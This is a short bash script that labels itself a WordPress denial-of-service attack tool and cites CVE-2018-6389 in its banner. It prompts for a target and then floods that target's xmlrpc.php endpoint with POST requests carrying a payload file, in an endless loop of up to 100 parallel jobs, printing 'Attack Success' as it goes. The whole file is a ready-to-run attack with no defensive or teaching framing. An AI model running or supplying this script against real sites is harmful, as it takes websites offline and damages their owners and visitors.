#!/bin/bash
#This colour
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'
LIMITATOR=100

clear
BANNERS () {
printf "${white}
██████╗  █████╗ ███╗   ██╗    ███╗   ███╗██╗████████╗ █████╗ ██╗  ██╗███████╗
██╔══██╗██╔══██╗████╗  ██║    ████╗ ████║██║╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝
██████╔╝███████║██╔██╗ ██║    ██╔████╔██║██║   ██║   ███████║█████╔╝ █████╗
██╔══██╗██╔══██║██║╚██╗██║    ██║╚██╔╝██║██║   ██║   ██╔══██║██╔═██╗ ██╔══╝
██║  ██║██║  ██║██║ ╚████║    ██║ ╚═╝ ██║██║   ██║   ██║  ██║██║  ██╗███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                 ${lightgreen}Wordpress Dos Attack Tools - Adelittle
                                CVE-2018-6389

"
}
BANNERS
OPTIONS () {
printf "${lightgreen}[>]${white} TARGET                    :${lightgreen} "
read list
}
OPTIONS

function ddos(){
        if [[ $(curl -i -s -k -X POST "${1}/xmlrpc.php" -H "Content-Type: text/xml" --data-binary "@payload.txt" ) =~ 'parse error' ]]; then
                printf "${lightgreen}[+] Attacking ${white} ${list} ${lightgreen}Attack Success \n"
        else
                printf "${red}[-]Failed Attack ${white} ${list} Maybe Down Or Not Vuln\n"
        fi
}

printf "\n \n${lightgreen}############## START ATTACKING ##############${white}\n"
while :
do
((cthread=cthread%LIMITATOR)); ((cthread++==0)) && wait
        ddos "${list}" &
done
wait
